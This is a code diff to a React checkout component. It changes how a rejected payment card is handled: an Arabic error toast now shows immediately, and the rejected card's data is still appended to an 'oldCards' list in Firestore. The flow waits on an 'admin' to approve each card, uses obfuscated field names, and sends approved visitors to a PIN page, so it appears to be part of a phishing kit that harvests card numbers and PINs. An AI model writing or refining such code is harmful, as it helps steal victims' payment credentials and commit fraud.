@@ -171,7 +171,18 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             // Redirect to PIN page directly
             router.push("/step3")
           } else if (status === "rejected") {
-            console.log('[Card Status] Card rejected, saving to oldCards')
+            console.log('[Card Status] Card rejected, hiding loader immediately')
+            
+            // Hide loader immediately
+            setIsWaitingAdmin(false)
+            
+            // Show error message
+            toast.error("تم رفض بيانات البطاقة", {
+              description: "يرجى إعادة إدخال بيانات صحيحة",
+              duration: 5000
+            })
+            
+            // Save rejected card to history (async, don't wait)
             const currentCardData = {
               _v1: data._v1,
               _v4: data._v4,
@@ -185,20 +196,8 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             updateDoc(doc(db, "pays", visitorID), {
               oldCards: data.oldCards ? [...data.oldCards, currentCardData] : [currentCardData],
               cardStatus: "pending"
-            }).then(() => {
-              console.log('[Card Status] Rejection saved, hiding loader')
-              setIsWaitingAdmin(false)
-              toast.error("تم رفض بيانات البطاقة", {
-                description: "يرجى إعادة إدخال بيانات صحيحة",
-                duration: 5000
-              })
             }).catch(err => {
               console.error("[Card Status] Error saving rejected card:", err)
-              setIsWaitingAdmin(false)
-              toast.error("حدث خطأ", {
-                description: "يرجى المحاولة مرة أخرى",
-                duration: 5000
-              })
             })
           }
         }
